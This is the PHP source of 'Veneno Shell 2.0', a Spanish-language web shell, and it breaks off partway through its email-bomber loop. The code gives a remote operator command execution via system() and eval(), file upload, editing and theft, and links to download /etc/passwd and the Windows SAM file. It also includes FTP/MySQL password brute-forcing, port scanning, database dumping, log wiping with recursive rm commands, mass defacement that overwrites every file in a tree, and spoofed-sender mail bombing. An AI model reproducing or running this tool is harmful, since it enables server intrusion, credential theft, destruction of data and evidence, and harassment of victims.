<?php

error_reporting(0);

/*

Veneno Shell 2.0


Venenako (C) 2012 - 2015


Mail : venenoderon[at]hotmail[com]
Web : blog.veneno.ovh

*/

@session_start();

$username = "f81f10e631f3c519d5a44d8da976fb67"; //veneno
$password = "f81f10e631f3c519d5a44d8da976fb67"; //veneno

if (isset($_POST['user'])) {
if (md5($_POST['user']) == $username && md5($_POST['pass']) == $password) {
$_SESSION['loginh'] = "1";
}
}

if (isset($_GET['chaunow'])) {
@session_destroy();
}

if ($_SESSION['loginh'] == 1) {

if (isset($_GET['info'])) {
die(phpinfo());
}

if (isset($_POST['sessionew'])) {
@session_start();
if ($_SESSION[$_POST['sessionew']] = $_POST['valor']) {
echo "<script>alert('Sesion aceptada');</script>";
} else {
echo "<script>alert('Error');</script>";
}
}

function creditos() {
echo "<br><br><br><br>"; // ventana termina
echo "<center>[+] &copy; VenenoShell 2012 - 2015 | Contacto: venenoderon[at]hotmail[com] | Web: blog.veneno.ovh [+]</center>";
exit(1);
}


if(isset($_GET['bajardb'])) {

$tod = @mysql_connect($_GET['host'],$_GET['usuario'],$_GET['password']); 
mysql_select_db($_GET['bajardb']);

$resultado = mysql_query("SHOW TABLES FROM ".$_GET['bajardb']);
  
while ($tabla = mysql_fetch_row($resultado)) {
foreach($tabla as $indice => $valor) {

$todo.= "<br><br>".$valor."<br><br>";

$resultadox = mysql_query("SELECT * FROM ".$valor);

$todo.="<div class=table>";

for ($i=0;$i< mysql_num_fields($resultadox);$i++) {
$todo.="<th>".mysql_field_name($resultadox,$i)."</th>";
}
while($dat = mysql_fetch_row($resultadox)) {
$todo.="<tr>";
foreach($dat as $val) {
$todo.="<td >".$val."</td>";
}
}
$todo.="</tr></div>";
} 
}
@mysql_free_result($tod);
@header("Content-type: application/vnd-ms-excel; charset=iso-8859-1");
@header("Content-Disposition: attachment; filename=".date('d-m-Y').".xls");
echo $todo;  
exit(1);
}

if(isset($_GET['bajartabla'])) {
$tod = mysql_connect($_GET['host'],$_GET['usuario'],$_GET['password']) or die("<h1>Error</h1>");
mysql_select_db($_GET['condb']);
if(!empty($_GET['sentencia'])) {
$resultado =  mysql_query($_GET['sentencia']);
} else {
$resultado = mysql_query("SELECT * FROM ".$_GET['bajartabla']);
}
$todo.="<div class=db>";
for ($i=0;$i< mysql_num_fields($resultado);$i++) {
$todo.="<th>".mysql_field_name($resultado,$i)."</th>";
}
while($dat = mysql_fetch_row($resultado)) {
$todo.="<tr>";
foreach($dat as $val) {
$todo.="<td>".$val."</td>";
}
}
@mysql_free_result($tod);
$todo.="</tr></div>";
@header("Content-type: application/vnd-ms-excel; charset=iso-8859-1");
@header("Content-Disposition: attachment; filename=".date('d-m-Y').".xls");
echo $todo;  
exit(1);
}

if (isset($_GET['reload'])) {
$tipo = pathinfo($_GET['reload']);
echo '<meta http-equiv="refresh" content="0;URL=?dir='.$tipo['dirname'].'">';
creditos();
}

function dame($file) {
return substr(sprintf('%o', fileperms($file)), -4);
}

if (isset($_GET['down'])) {
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename=".basename($_GET['down']));
readfile($_GET['down']);
exit(0);
}

if (isset($_POST['cookienew'])) {
if (setcookie($_POST['cookienew'],$_POST['valor'])) {
echo "<script>alert('Cookie creada');</script>";
echo '<meta http-equiv="refresh" content="0;URL=?cookiemanager">';
} else {
echo "<script>alert('Error');</script>";
}
}


echo '<style>
    html,
    * {
        margin: 0;
        padding: 0;
    }
    body {
        background: url(http://i.imgur.com/6mD2Zzt.png);
        font-size: 12px;
        font-family: Tahoma, Verdana, Arial;
        color: grey;
    }
    a {
        color: white;
    }
    .table {
        width: 850px;
        border: 1px red solid;
        padding: 5px;
        margin: 0px auto;
        background: url(http://i.imgur.com/sDbaMsW.gif);
        margin: 10px auto;
    }
    .menu a {
        padding: 4px 18px;
        margin: 0;
        background: #222222;
        text-decoration: none;
        letter-spacing: 2px;
        -moz-border-radius: 5px;
        -webkit-border-radius: 5px;
        -khtml-border-radius: 5px;
        border-radius: 5px;
    }
    .menu a:hover {
        background: #191919;
        border-bottom: 1px solid #333333;
        border-top: 1px solid #333333;
    }
    .imgs {
        display: table;
    }
    .image1 {
        margin: auto;
        margin-left: 350px;
        margin-top: -600px;
    }
    INPUT,TEXTAREA,table,SELECT,FIELDSET{font-family:courier new; font-size:11px; font-weight:bold; background:#101010; color:red; border-top:1px solid red; border-left:1px solid red; border-right:1px solid red; border-bottom:1px solid red;}
</style>';

echo "<title>".$_SERVER["SERVER_NAME"]." - VenenoShell</title>";



$verdad = php_uname('s').php_uname('r');
$link = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=".$verdad."&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
echo "<center><div class=table><br><img src=http://i.imgur.com/S3XO7b5.png /><br>
<b>Sistema</b>: <a href='".$link."'>".$verdad."</a> "." ".php_uname('v')." <b>Servidor</b>: ".$_SERVER['SERVER_SOFTWARE']."<br>";

if (file_exists("C:/WINDOWS/repair/sam")) {
echo "<b>Archivo encontrado: </b><a href=?down=C:/WINDOWS/repair/sam>SAM</a>&nbsp;&nbsp;&nbsp;&nbsp;";
}
if (file_exists("/etc/passwd")) {
echo "<b>Archivo encontrado: </b><a href=?down=/etc/passwd>etc/passwd</a>&nbsp;&nbsp;&nbsp;&nbsp;";
}
echo "<b>IP</b>: ".$_SERVER['SERVER_ADDR']."&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<b>Usuario</b>: uid=".getmyuid()." (".get_current_user().") gid=".getmygid()."&nbsp;&nbsp;&nbsp;
<b>Path</b>: ".getcwd()."&nbsp;&nbsp;&nbsp;
<br><b>Version PHP</b>: ".phpversion()."";
if (ini_get('safe_mode')==0) {
echo "<b> Modo seguro</b>: OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";  
} else {
echo "<b> Modo seguro</b>: <font color=green>ON</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}
if (get_magic_quotes_gpc() == "1" or get_magic_quotes_gpc() == "on") {
echo "<b>Magic Quotes</b>: <font color=green>ON</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
} else {
echo "<b>Magic Quotes</b>: OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}
exec("perl -h",$perl);
if ($perl) {
echo "<b>Perl</b>: <font color=green>ON</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
} else {
echo "<b>Perl</b>: OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}
exec("wget --help",$wget);
if ($wget) {
echo "<b>WGET</b>: <font color=green>ON</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
} else {
echo "<b>WGET</b>: OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}
exec("curl_version",$curl);
if ($curl) {
echo "<b>CURL</b>: <font color=green>ON</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
} else {
echo "<b>CURL</b>: OFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

echo "<br><br>";

echo "


<a href=?dir=>Navegar</a> X
<a href=?cmd=>CMD</a> X
<a href=?upload=>Subir</a> X
<a href=?base64=>Base64</a> X
<a href=?phpconsole=>Consola PHP</a> X
<a href=?info=>infoPHP</a> X
<a href=?bomber=>Mailer</a> X
<a href=?cracker=>Crackers</a> X
<a href=?proxy=>ProxyWeb</a> X
<a href=?port=>Puerto escaner</a><br>
<a href=?md5=>Codificadores</a> X
<a href=?md5crack=>MD5 Cracker</a> X
<a href=?backshell>BackShell</a> X
<a href=?mass=>MassDeface</a> X
<a href=?logs=>LimpiaLogs</a> X
<a href=?ftp=>FTP</a> X
<a href=?cookiemanager=>Cookies</a> X
<a href=?sessionmanager=>Sesion</a> X
<a href=?chau=>Destruir</a>

</center>
<br><br>
";

echo "<div class=table><br>"; //ventana inicia
//and count($_POST) == 0
if (count($_GET) == 0) {

echo <<<_HTML_
<center><pre>
                                                                     
                                .do-"""""'-o..                         
                             .o""            ""..                       
                           ,,''                 ``b.                   
                          d'                      ``b                   
                         d`d:                       `b.                 
                        ,,dP                         `Y.               
                       d`88                           `8.               
 ooooooooooooooooood888`88'                            `88888888888bo, 
d"""    `""""""""""""Y:d8P                              8,          `b 
8                    P,88b                             ,`8           8 
8                   ::d888,                           ,8:8.          8 
:                   dY88888                           `' ::          8 
:                   8:8888                               `b          8 
:                   Pd88P',...                     ,d888o.8          8 
:                   :88'dd888888o.                d8888`88:          8 
:                  ,:Y:d8888888888b             ,d88888:88:          8 
:                  :::b88d888888888b.          ,d888888bY8b          8 
                    b:P8;888888888888.        ,88888888888P          8 
                    8:b88888888888888:        888888888888'          8 
                    8:8.8888888888888:        Y8888888888P           8 
,                   YP88d8888888888P'          ""888888"Y            8 
:                   :bY8888P"""""''                     :            8 
:                    8'8888'                            d            8 
:                    :bY888,                           ,P            8 
:                     Y,8888           d.  ,-         ,8'            8 
:                     `8)888:           '            ,P'             8 
:                      `88888.          ,...        ,P               8 
:                       `Y8888,       ,888888o     ,P                8 
:                         Y888b      ,88888888    ,P'                8 
:                          `888b    ,888888888   ,,'                 8 
:                           `Y88b  dPY888888OP   :'                  8 
:                             :88.,'.   `' `8P-"b.                   8 
:.                             )8P,   ,b '  -   ``b                  8 
::                            :':   d,'d`b, .  - ,db                 8 
::                            `b. dP' d8':      d88'                 8 
::                             '8P" d8P' 8 -  d88P'                  8 
::                            d,' ,d8'  ''  dd88'                    8 
::                           d'   8P'  d' dd88'8                     8 
 :                          ,:   `'   d:ddO8P' `b.                   8 
 :                  ,dooood88: ,    ,d8888""    ```b.                8 
 :               .o8"'""""""Y8.b    8 `"''    .o'  `"""ob.           8 
 :              dP'         `8:     K       dP''        "`Yo.        8 
 :             dP            88     8b.   ,d'              ``b       8 
 :             8.            8P     8""'  `"                 :.      8 
 :            :8:           :8'    ,:                        ::      8 
 :            :8:           d:    d'                         ::      8 
 :            :8:          dP   ,,'                          ::      8 
 :            `8:     :b  dP   ,,                            ::      8 
 :            ,8b     :8 dP   ,,                             d       8 
 :            :8P     :8dP    d'                       d     8       8 
 :            :8:     d8P    d'                      d88    :P       8 
 :            d8'    ,88'   ,P                     ,d888    d'       8 
 :            88     dP'   ,P                      d8888b   8        8 
 '           ,8:   ,dP'    8.                     d8''88'  :8        8 
             :8   d8P'    d88b                   d"'  88   :8        8 
             d: ,d8P'    ,8P""".                      88   :P        8 
             8 ,88P'     d'                           88   ::        8 
            ,8 d8P       8                            88   ::        8 
            d: 8P       ,:  -hrr-                    :88   ::        8 
            8',8:,d     d'                           :8:   ::        8 
           ,8,8P'8'    ,8                            :8'   ::        8 
           :8`' d'     d'                            :8    ::        8 
           `8  ,P     :8                             :8:   ::        8 
            8, `      d8.                            :8:   8:        8 
            :8       d88:                            d8:   8         8 
 ,          `8,     d8888                            88b   8         8 
 :           88   ,d::888                            888   Y:        8 
 :           YK,oo8P :888                            888.  `b        8 
 :           `8888P  :888:                          ,888:   Y,       8 
 :            ``'"   `888b                          :888:   `b       8 
 :                    8888                           888:    ::      8 
 :                    8888:                          888b     Y.     8, 
 :                    8888b                          :888     `b     8: 
 :                    88888.                         `888,     Y     8: 
 ``ob...............--"""""'----------------------`""""""""'"""`'"""""

</pre></center>                                                             
_HTML_;

}

if (isset($_GET['cracker'])) {
echo "
<h2><center>Multi Cracker</center></h2><br>
<form action='' method=POST>
<center><table>
<b>Host: </b><br><input type=text name=host value=localhost><br><br>
<b>User: </b><br><input type=text name=user value=neeno><br><br>
<b>Wordlist: </b><br><input type=text name=passnow value='/var/www/list.txt'><br><br>
<b>Servicio: </b><br><select name=services><option>FTP</option><option>MYSQL</option></select><br><br>
<input type=submit value=Crack><br><br></center>
</form>

";

if (isset($_POST['passnow'])) {

$open = fopen($_POST['passnow'],"r");

echo "<br><br><fieldset><center>";
echo "<br>[+] Crackeando<br><br>";

if ($_POST['services'] == "FTP") {
echo "[+] Servicio : FTP<br><br>"; 

while(!feof($open)) {
$word = fgets($open,255);
$linea = chop($word);
if ($enter = ftp_connect($_POST['host'])) {
if ($dentro = ftp_login($enter,$_POST['user'],$linea)) {
echo "[+] Usuario: ".$_POST['user']."<br>";
echo "[+] Clave: ".$linea."<br>";
fclose($open);
ftp_close($enter); 
echo "<br><br>[+] Escaner finalizado<br><br>";
creditos();
}
}
}
echo "<br><br>[+] Escaner finalizado<br><br>";
}

if ($_POST['services'] == "MYSQL") {
echo "[+] Servicio: MYSQL<br><br>"; 

while(!feof($open)) {
$word = fgets($open,255);
$linea = chop($word);
if (mysql_connect($_POST['host'],$_POST['user'],$linea)) {
echo "[+] Usuario: ".$_POST['user']."<br>";
echo "[+] Clave: ".$linea."<br>";
fclose($open);
mysql_close();
echo "<br><br>[+] Escaner finalizado<br><br>";
creditos();
}
}
echo "<br><br>[+] Escaner finalizado<br><br>";
}
}
}


if (!empty($_GET['hostar'])) {

@set_time_limit(5);

echo "<center><h2>Escaner de puertos</h2></center><br><br>";
echo "<fieldset>"; 
echo "[+] <b>Victima: </b>".$_GET['hostar']."<br><br>";
echo "[+] <b>Escanear hasta: </b>".$_GET['start']."-".$_GET['end']."<br><br>";   

for ( $i = $_GET['start'] ; $i < $_GET['end'] ; $i++ ) {
$re = @fsockopen($_GET['hostar'],$i,$errno,$errstr,1);
if ($re) {
echo "<b>[+] Puertos encontrados: </b>".$i."<br>";
}
}
echo "<br><br><b>[+] Escaner finalizado [+]</b><br><br>";
echo "</fieldset>";
}


if (isset($_GET['port'])) {
echo "<center><h2>Escaner de puertos</h2></center><br><br>";
echo "<center>
<form action='' method=GET>
<fieldset><br>
<td><b>Host: </b></td><td><input type=text name=hostar value=localhost></td><tr><br><br>
<td><b>Port Start: </b></td><td><input type=text name=start value=79></td><tr><br><br>
<td><b>Port End: </b></td></b><td><input type=text name=end value=82></td><tr><br><br>
<input type=submit value=Scan><br><br>
</fieldset>
</form></center>
<br>";

}


if (isset($_GET['proxy'])) {

echo "<center><h2>Simple ProxyWeb</h2></center><br><br>";
echo "<center><form action='' method=GET>";
echo "<b>Web : </b><input type=text size=40 name=proxy value=http://localhost/sql.php><input type=submit value=Get>";
echo "</form></center>";  
$code = @file_get_contents($_GET['proxy']);
if ($code) {
echo "<br><br><fieldset>".$code."<br><br></fieldset>";
}
}



if (isset($_GET['md5'])) {

echo "<form action='' method=POST>
<b>Text :</b> <input type=text name=tex value=test><select name=optionsa><option>MD5</option><option>SHA1</option><option>CRC32</option></select><input type=submit value=Encode>
</form>
";

}

if (isset($_POST['tex'])) {
echo "<br><br>Result<br><br><fieldset>";
if ($_POST['optionsa'] == "MD5") {
echo md5($_POST['tex']);
}
if ($_POST['optionsa'] == "SHA1") {
echo sha1($_POST['tex']);
}
if ($_POST['optionsa'] == "CRC32") {
printf("%u\n",crc32($_POST['tex']));
}
echo "</fieldset>";
}


if(isset($_GET['perms'])) {
echo "
<form action='' method=POST>
<b>Archivo:</b> <input type=text name=archivo value=".$_GET['perms'].">
<br>
Perms: <input type=text name=perms value=".dame($_GET['perms'])."
<br><br>
<br><input type=submit name=cambiarperms value=Change>
</form>
";
}
if (isset($_POST['cambiarperms'])) {
if (chmod($_POST['archivo'],$_POST['perms'])) {
echo "<script>alert('Cambiados');</script>";
} else {
echo "<script>alert('Error');</script>";
} 
echo "<br><br><font color=red><center><a href=?reload=".$_POST['archivo'].">Atr&aacutes</a><br><br></font>
";
}

if (isset($_GET['ren'])) {
echo "
<form action='' method=POST>
Archivo: <input type=text name=nombre value=".$_GET['ren']."><br>
Cambiar a: <input type=text name=cambio><br><BR>
<input type=submit name=cambios value=Change><BR>
</form>
";
}

if (isset($_POST['cambios'])) {
if (@rename($_POST['nombre'],$_POST['cambio'])) {
echo "<script>alert('Cambiado');</script>";
} else {
echo "<script>alert('Error');</script>";
}
echo "<br><br><font color=red><center><a href=?reload=".$_POST['cambios'].">Atras</a><br><br></font></center>";
}

if (isset($_POST['crear1'])) {
chdir($_POST['dir']);
if (fopen($_POST['crear1'],"w")) {
echo "<script>alert('Archivo creado');</script>";
}else {
echo "<script>alert('Error');</script>";
}
echo "<br><br><font color=red><center><a href=?reload=".$_POST['dir'].">Atr&aacutes</a><br><br></font></center>";
}

if (isset($_POST['crear2'])) {
chdir($_POST['dir']);
if (@mkdir($_POST['crear2'],777)) {
echo "<script>alert('Directorio creado');</script>";
} else {
echo "<script>alert('Error');</script>";
}
echo "<br><br><font color=red><center><a href=?reload=".$_POST['dir'].">Atr&aacutes</a><br><br></font></center>";
}

if (isset($_GET ['copiar'])) {
echo '
<form action="" method=POST>
Archivo: <input type=text name=archivo value='.$_GET['copiar'].'><br>
Copiar a: <input type=text name=nuevo><br><br>
<input type=submit name=copiado value=Copy><BR>
</form>
';
}

if (isset($_POST['copiado'])) {
if (copy($_POST['archivo'],$_POST['nuevo'])) {
echo "<script>alert('OK');</script>";
} else {
echo "<script>alert('Error');</script>";
}
echo "<br><br><font color=red><center><a href=?reload=".$_POST['archivo'].">Atr&aacutes</a><br><br></font></center>";
}

if (isset($_GET['open'])) {
echo "<form action='' method=POST>";
echo "<center>";
echo "<textarea cols=80 rows=40 name=code>";
$archivo = file($_GET['open']);
foreach($archivo as $n=>$sub) {
$texto = htmlspecialchars($sub);
echo $texto;
}
echo "</textarea></center>";
echo "<br><br><center><input type=submit value=Save name=modificar></center><br><br>";
echo "</form>";
}

if (isset($_POST['modificar'])) {
$modi = fopen($_GET['open'],'w+');
if ($yeah = fwrite($modi,$_POST['code'])) {
echo "<script>alert('OK');</script>";
} else {
echo "<script>alert('Error');</script>";
}
echo "<br><br><font color=red><center><a href=?reload=".$_GET['open'].">Atr&aacutes</a><br><br></font></center>";
}


if (isset($_POST['options'])) {

$files = $_POST['valor'];

if ($_POST['options'] == "Delete") {
foreach ($files as $file) {
if (filetype($file) == "dir") {
//@rmdir($file);
} else {
//@unlink($file);
}
}
echo '<meta http-equiv=Refresh content="0;url=?dir='.$dir->path.'">';
echo "<script>alert('Archivos eliminados');</script>";
}

if ($_POST['options'] == "Download") {
foreach ($files as $file) {
echo '<meta http-equiv=Refresh content="0;url=?down='.$file.'">';
exit(0);
}
}

if ($_POST['options'] == "Copy") {
echo "<form action='' method=POST>";
foreach($files as $file) {
echo 'Name : <input type=text name=rutax[] value="'.$file.'"> a: <input type=text name=cambiax[] value="'.$file.'"><br>';
}
echo "<br><br><input type=submit value=Copy>";
echo "</form>";
exit(0);
}

if ($_POST['options'] == "Move") {
echo "<form action='' method=POST>";
foreach($files as $file) {
echo 'Nombre: <input type=text name=rutas[] value="'.$file.'"> a: <input type=text name=cambiar[] value="'.$file.'"><br>';
}
echo "<br><br><input type=submit name=mirameboludo value=Move>";
echo "</form>";

creditos();
}
}

if (isset($_POST['rutax'])) {
$tengo = count($_POST['rutax']);
for ($i = 0; $i <= $tengo; $i++) {
@copy($_POST['rutax'][$i],$_POST['cambiax'][$i]);
}
echo "<script>alert('Archivos copiados');</script>";
}

if (isset($_POST['mirameboludo'])) {
$tengo = count($_POST['rutas']);
for ($i = 0; $i <= $tengo; $i++) {
@rename($_POST['rutas'][$i],$_POST['cambiar'][$i]);
}
echo "<script>alert('Archivos movidos');</script>";
}


if (isset($_GET['dir'])) {
if ($_GET['dir']=="") {
$path = getcwd();
@chdir($path);
$dir = @dir($path);
} else {
$path = $_GET['dir'];
@chdir($path);
$dir = @dir($path);
}

$scans = range("B","Z");
echo "<b>Eliminar drives: </b>";
foreach($scans as $drive) {
$drive = $drive.":\\";
if (is_dir($drive)) {
echo "&nbsp;&nbsp;"."<a href=?dir=".$drive.">".$drive."</a>";
}
}

echo "
<br><br>
<form action='' method=GET>
<b>Directorio</b>: <input type=text name=dir value=".$path."><input type=submit name=ir value=Navegar>
</form>
<br><br>
<form action='' method=POST>
<b>Nuevo archivo</b>: <input type=text name=crear1><input type=hidden name=dir value=".$dir->path."><input type=submit value=Crear>
</form>
<form action='' method=POST>
<b>Nuevo Directorio</b>: <input type=text name=crear2><input type=hidden name=dir value=".$dir->path."><input type=submit value=Crear>
</form><br><br>
";

$archivos = array('dir'=>array(),'file'=>array());
while ($archivo = $dir->read()) {
$ver = @filetype($path.'/'.$archivo) ;
if ($ver=="dir") {
$archivos['dir'][] = $path.'/'.$archivo;
} else {
$archivos['file'][] = $path.'/'.$archivo;
}
}
$dir->rewind();

if (count($archivos['dir'])==0 and count($archivos['file']==0)) {
echo "<script>alert('Directorio borrado');/<script>";
}
echo "<form action='' method=POST>";
echo "<br><b>Directorios encontrados</b>: ".count($archivos['dir'])."<br>";
echo "<b>Archivos encontrados</b>: ".count($archivos['file'])."<br><br><br>";
echo "<table background=http://i.imgur.com/sDbaMsW.gif border=1>";
echo "<td width=200>Nombre</td><td width=100>Type</td><td width=100>Tiempo modificado</td>";
echo "<td width=150>Permisos</td><td width=150>Accion</td>";
echo "<tr>";
foreach ($archivos['dir'] as $dirs) {
$dirsx = pathinfo($dirs);
echo "<td width=150><a href=?dir=".$dirs.">".$dirsx['basename']."</a></td>";
echo "<td width=150>Directory</td>";
echo "<td width=200>".date("F d Y H:i:s",fileatime($dirs))."</td>";
echo "<td width=150><a href=?perms=".$dirs.">".dame($dirs)."</a></td>";
echo "<td><input type=checkbox name=valor[] value=".$dirs."></td>";
echo "</tr><tr>";
}
foreach ($archivos['file'] as $files) {
$filex = pathinfo($files);
echo "<td width=100><a href=?open=".$files.">".$filex['basename']."</a></td>";
echo "<td width=100>File</td>";
echo "<td width=100>".date("F d Y H:i:s",fileatime($files))."</td>";
echo "<td width=100><a href=?perms=".$files.">".dame($files)."</a></td>";
echo "<td><input type=checkbox name=valor[] value=".$files."></td>";
echo "</tr><tr>";
}
echo "</table>";

echo"<br><br>
Opciones : 
<select name=options>
<option>Eliminar</option>
<option>Mover</option>  
<option>Copiar</option>
<option>Descargar</option>
</select>&nbsp;&nbsp;<input type=submit value=Ok></form>";

}

if (isset($_GET['cmd'])) {
echo '<center><h2>Consola</h2><br>
<form action="" method=POST>
<b>Comando: </b><input type=text name=comando size=50><input type=submit name=ejecutar value=Now>
</form></center>
';
}

if (isset($_POST['ejecutar'])) {
echo '<center><br>
<br><br>Comando<br><br>
<fieldset>
'.$_POST['comando'].'</fieldset>
<br><br>Resultado<br><br><fieldset>';
if (!system($_POST['comando'])) {
echo "<script>alert('Error al ejecutar');</script>";
echo "Error";
}
echo "</center><br><br></fieldset><br><br>";
}

if (isset($_GET['upload'])) {
echo "<center><h2>Subir archivos</h2></center><center><br><br><br>";
echo '
<form enctype="multipart/form-data" action="" method=POST>
<b>Archivo: </b><input type=file name=archivo><br><br>  
<b>Directorio: </b><input type=text name=destino value='.getcwd().'>
<input type=submit value=Upload><br>
</form>';
if (isset($_FILES['archivo'])) {
$subimos = basename($_FILES['archivo']['name']);
if (move_uploaded_file($_FILES['archivo']['tmp_name'],$subimos)) {
if (copy($subimos,$_POST['destino']."/".$subimos)) { 
unlink($subimos);
echo "<script>alert('Archivo subido');</script>";
}
} else {
echo "<script>alert('Error');</script>";
}}}

if (isset($_GET['base64'])) {
echo '<center><h2>De/Codificador base64</h2><br>
<form action="" method=POST>
<b>Codificar:</b> <input type=text name=code size=50><input type=submit name=codificar value=Encode>
</form>
<form action="" method=POST>
<b>Decodificar:</b> <input type=text name=decode size=50><input type=submit name=decodificar value=Decode>
</form></center>
';
}
if (isset($_POST['codificar'])) {
echo "<center>";
echo "<br><br>Texto<br><br><fieldset>".$_POST['code']."</fieldset><br><br>Resultado<br><br><fieldset>";
echo base64_encode($_POST['code'])  ;
echo "</fieldset></center><br><br>";
}

if (isset($_POST['decodificar'])) {
echo "<center><br><br>Texto<br><br><fieldset>".$_POST['decode']."</fieldset><br><br>Resultado<br><br><fieldset>";
echo base64_decode($_POST['decode']);
echo "</fieldset></center><br><br>";
}

if (isset($_GET['phpconsole'])) {
echo '<center><h2>Funcion eval()</h2><center><br>
<form action="" method=POST>
<b>C&oacutedigo:</b> <input type=text name=codigo size="70"><input type=submit name=cargar value=OK>
</form>
';
}

if (isset($_POST['cargar'])) {
echo "<br><br>C&oacutedigo<br><br>
<fieldset>
".$_POST['codigo']."
</fieldset>
<br><br>
Resultado<br><br>
<fieldset>";
eval($_POST['codigo']);
echo "</fieldset>
";
}

if (isset($_GET['logs'])) {
echo '
<br><br><center><h3>Pateador</h3>
<br><br>
<form action="" method=GET>
<input type=submit name=clean value=Start>
</form></center>
<br><br>
';
}

if (isset($_GET['clean'])) {

$paths = array("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp","/var/log/secure","/root/.ksh_history", "/root/.bash_history","/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp","/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm",
"/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs","/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog",
"/var/log/messages/", "/var/log/proftpd/xferlog.legacy","/var/log/proftpd.xferlog", "/var/log/proftpd.access_log","/var/log/httpd/error_log", "/var/log/httpsd/ssl_log","/var/log/httpsd/ssl.access_log", "/etc/mail/access",
"/var/log/qmail", "/var/log/smtpd", "/var/log/samba","/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority","/var/log/poplog", "/var/log/news.all", "/var/log/spooler","/var/log/news", "/var/log/news/news", "/var/log/news/news.all",
"/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice","/var/log/news/suck.err", "/var/log/news/suck.notice","/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks","/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log","/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs","/var/log/auth");

echo "<br><br><center><h2>OutPut</h2></center>";

$comandos  = array('find / -name *.bash_history -exec rm -rf {} \;' , 'find / -name *.bash_logout -exec rm -rf {} \;','find / -name log* -exec rm -rf {} \;','find / -name  *.log -exec rm -rf {} \;','unset HISTFILE','unset SAVEHIST');
echo "<center>";
foreach($paths as $path) {
if(@unlink($path)) {
echo $path.": <b>Eliminado</b><br>";
}
}
echo "<br><br>";
foreach($comandos as $comando) {
echo "<b>Ejecutar comando: </b>".$comando."<br>";
system($comando);
}
echo "<center>";
}



if(isset($_GET['mass'])) {
echo "<center><h2>[+] Mass Defacement [+]</h2></center><br><br><center>
<form action='' method=POST>
<b>Directorio principal:</b> <input type=text name=dir value=".getcwd()."><br><br>
<b>Codigo:</b> <input type=text name=codigo size=70>
<input type=submit name=def value=Start>
</form>
</center>
";
}



function juntar ($dira,$text) {
$dir= opendir($dira);
while (!is_bool($archivos = readdir($dir))) {
if ($archivos != "..") {
if ($archivos != ".")  {
if ($archivos != basename($_SERVER['PHP_SELF'])) {
if (@filetype($dira."/".$archivos) == dir) {
juntar($dira."/".$archivos,$text);
} else {
echo "<center>";
echo "<b>Deface: </b>".$dira."/".$archivos."<br>";
$solo = fopen($dira."\\".$archivos,"w");
$solo = fwrite($solo,$text);  
fclose($solo);
echo "</center>";
}}}}}}  


if (isset($_POST['def'])) {
echo "<br><br><center><h2>OutPut</h2></center><br><br>";
juntar($_POST['dir'],$_POST['codigo']);
}


if (isset($_GET['chau'])) {
if ($_GET['chau'] == "fuckit") {
echo "<br><br><h3>BOOOOOOOM!!!</h3><br><br>";
//unlink(basename($_SERVER['PHP_SELF'])); //descomentar para usar esta funcion
} else {
echo "<br><br><font color=red><h3><center>Acceso Denegado</center></h3></font><br><br>";
}
}

if (isset($_GET['bomber'])) {
echo "<center><h2>Email bomber</h2></center><br><br>
<form action='' method=POST>
<center><table border=1>
<td>CorreoVictima: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=idiot value=victima@hotmail.com size=44><tr>
<td>Correo falso: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=falso value=veneno@usa.gov size=44><tr>
<td>Nombre falso: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=nombrefalso value=Veneno size=44><tr>
<td>Lista de emails: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=listamails value=Nada size=44><tr>
<td>Asunto: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=asunto value=Correo falso size=44><tr>
<td>Cuenta: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=count value=1 size=44><tr>
<td>Mensaje: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><textarea name=mensaje rows=7 cols=40>Esto es un correo anonimo</textarea></td><tr>
</table><br><br>
<input type=submit name=bombers value=Enviar></center>
</form>
";
}

if (isset($_POST['bombers'])) {

$need .="MIME-Version: 1.0\n";
$need .="Content-type: text/html ; charset=iso-8859-1\n";
$need .="MIME-Version: 1.0\n";
$need .="From: ".$_POST['nombrefalso']." <".$_POST['falso'].">\n";
$need .="To: ".$_POST['nombrefalso']."<".$_POST['falso'].">\n";
$need .="Reply-To:".$_POST['falso']."\n";
$need .="X-Priority: 1\n";
$need .="X-MSMail-Priority:Hight\n";
$need .="X-Mailer:Widgets.com Server";

echo "<br><br><br><center><h2>Resultado</h2><br><br>";

for ($i = 1; $i <= $_POST['count']; $i++) {

if ($_POST['listamails'] != "None") {

$open = fopen($_POST['listamails'],"r");

while(!feof($open)) {
$word = fgets($open,255);
$word = chop($word);

if(@mail($word,$_POST['asunto'],$_POST['mensaje'],$need)) {
